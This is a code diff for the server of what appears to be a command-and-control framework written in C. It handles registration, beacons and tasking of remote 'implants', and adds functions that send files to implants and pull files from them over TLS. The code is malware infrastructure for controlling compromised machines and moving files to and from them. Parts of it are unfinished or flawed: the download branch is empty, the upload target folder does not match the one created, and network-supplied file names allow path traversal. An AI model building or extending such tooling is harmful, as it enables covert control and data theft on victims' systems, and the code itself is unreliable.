@@ -3,6 +3,7 @@
 #include <openssl/err.h>
 #include <openssl/ssl.h>
 #include <cjson/cJSON.h>
+#include <fcntl.h>
 
 #include "logs.h"
 #include "db.h"
@@ -142,8 +143,8 @@ char *beacon_implant(MYSQL* con, cJSON *json) {
 
         char *reply = cJSON_Print(json_reply);
         
-        // if command = "upload [file path]" | upload file to agent 
-        // if command = "download [file path]" | download file from agent
+        //if command = "upload [file path]" | upload file to agent 
+        //if command = "download [file path]" | download file from agent
         //if (strncmp(cmd, "download", 8) ==0 || strncmp(cmd, "upload", 6) == 0) {
         //    char file[BUFFER_SIZE];
         //    char command[BUFFER_SIZE];
@@ -238,9 +239,7 @@ void *implant_handler(void *args) {
             log_message(LOG_WARN, "NO mode key in JSON");
         } else if (strcmp(type->valuestring, "register") == 0) {
             char *reply = register_implant(con, json, arg->ip);
-            
             if (reply == NULL) return NULL;
-
             SSL_write(ssl, reply, strlen(reply));
             free(reply);
         } else if (strcmp(type->valuestring, "beacon") == 0) {
@@ -254,6 +253,13 @@ void *implant_handler(void *args) {
             }
             cJSON *mode = cJSON_GetObjectItem(check_mode, "mode");
             if (strncmp(mode->valuestring, "none", 4) == 0) return NULL;
+
+            cJSON *cmd = cJSON_GetObjectItem(check_mode, "command");
+            if (strncmp(cmd->valuestring, "upload", 6) == 0) {
+                implant_upload(ssl);
+            } else if (strncmp(cmd->valuestring, "download", 8) == 0) {
+
+            }
 
             char buffer[MAX_RESPONSE];
             int bytes_received = SSL_read(ssl, buffer, sizeof(buffer)-1);
@@ -281,7 +287,7 @@ void *implant_handler(void *args) {
             }
             store_task_response(con, command_response->valuestring, task_id->valueint);
             cJSON_Delete(response);
-        }
+        } 
         CLEANUP: 
         cJSON_Delete(json);
         SSL_shutdown(ssl);
@@ -361,3 +367,123 @@ void *implant_handler(void *args) {
     }
 }
 
+
+// send file to implant
+int implant_upload(SSL *ssl) {
+        // check if folder exists
+        if (check_if_dir_exists("./uploads/implant/") == false) {
+            if (create_dir("./uploads/implant") == false) {
+                return -1;
+            }
+        }
+        char filename[BUFFER_SIZE];
+        SSL_read(ssl, filename, sizeof(filename) -1);
+        cJSON *get_filename = cJSON_Parse(filename);
+        if (!get_filename) {
+            log_message(LOG_ERROR, "Failed to ");
+            return -1;
+        }
+    
+        cJSON *name = cJSON_GetObjectItem(get_filename, "file_name");
+        //memset(filename, 0, sizeof(filename));
+        strncpy(filename, name->valuestring, sizeof(filename)-1);
+        log_message(LOG_INFO, "Receiving file with name : %s", filename);
+        cJSON_Delete(get_filename);
+    
+        char *contents = (char*)malloc(MAX_INFO);
+        char filepath[BUFFER_SIZE + 32]; // = "./uploads_operator";
+        
+        
+        snprintf(filepath, sizeof(filepath), "./uploads/operator/%s", filename);
+    
+        int fd = open(filepath, O_WRONLY|O_CREAT|O_TRUNC, 0644);
+        if (fd == -1) {
+            log_message(LOG_ERROR, "Failed to create file descriptor for : %s", filepath);
+            return -1;
+        }
+    
+        log_message(LOG_INFO, "Writing to file : %s ", filepath);
+        size_t bytesRead;
+        size_t filesize;
+        SSL_read(ssl, &filesize, sizeof(filesize));
+    
+        size_t received = 0;
+        while (received < filesize) {
+            bytesRead = SSL_read(ssl, contents, FILE_CHUNK);
+            write(fd, contents, bytesRead);
+            received += bytesRead;
+        }
+
+        log_message(LOG_INFO, "Wrote data to file : %s ", filepath);
+        free(contents);
+        return 0;
+}
+
+
+// send download file to imlant
+int implant_download(SSL *ssl) {
+
+    char filename[BUFFER_SIZE];
+    SSL_read(ssl, filename, sizeof(filename) -1);
+    cJSON *get_filename = cJSON_Parse(filename);
+    if (!get_filename) {
+        log_message(LOG_ERROR, "Failed to ");
+        return -1;
+    }
+    cJSON *name = cJSON_GetObjectItem(get_filename, "file_name");
+    strncpy(filename, name->valuestring, sizeof(filename)-1);
+    cJSON *dir = cJSON_GetObjectItem(get_filename, "dir");
+    
+    char base_path[BUFFER_SIZE];
+    snprintf(base_path, BUFFER_SIZE, "./uploads/%s", dir->valuestring);
+
+    char filepath[BUFFER_SIZE * 2];
+    snprintf(filepath, sizeof(filepath), "%s/%s", base_path, filename);
+
+
+    char *contents = (char*)malloc(MAX_INFO);
+    if (contents == NULL) {
+        log_message(LOG_ERROR, "[Upload File] failed to allocate memory");
+        return -1;
+    }
+
+    int fd = open(filepath, O_RDONLY);
+    if (fd == -1) {
+        log_message(LOG_ERROR, "[Upload file] Failed to open file descriptor for : %s", filepath);
+        return -1;
+    }
+
+    cJSON *dir_exists = cJSON_CreateObject();
+    char *filepath_ = search_file(base_path, filename);
+    if (filepath_ == NULL) {
+        cJSON_AddBoolToObject(dir_exists, "Exist", false);
+        char *exists = cJSON_Print(dir_exists);
+        cJSON_Delete(dir_exists);
+        SSL_write(ssl, exists, strlen(exists));
+        free(exists);
+        //log_message(LOG_ERROR, "File Does Not Exist filename - %s", filename);
+        return -1;
+    }
+    cJSON_AddBoolToObject(dir_exists, "Exist", true);
+
+    char *exists = cJSON_Print(dir_exists);
+    cJSON_Delete(dir_exists);
+    SSL_write(ssl, exists, strlen(exists));
+    free(exists);
+    
+    log_message(LOG_INFO, "Uploading %s", filename);
+
+    // send file size
+    struct stat st;
+    fstat(fd, &st);
+    size_t filesize = st.st_size;
+    SSL_write(ssl, &filesize, sizeof(filesize));
+    size_t bytesRead;
+    while ((bytesRead = read(fd, contents, FILE_CHUNK)) > 0) {
+        SSL_write(ssl, contents, bytesRead);
+    }
+    
+    log_message(LOG_INFO, "Upload Completed");
+    free(contents);
+    return 0;
+}
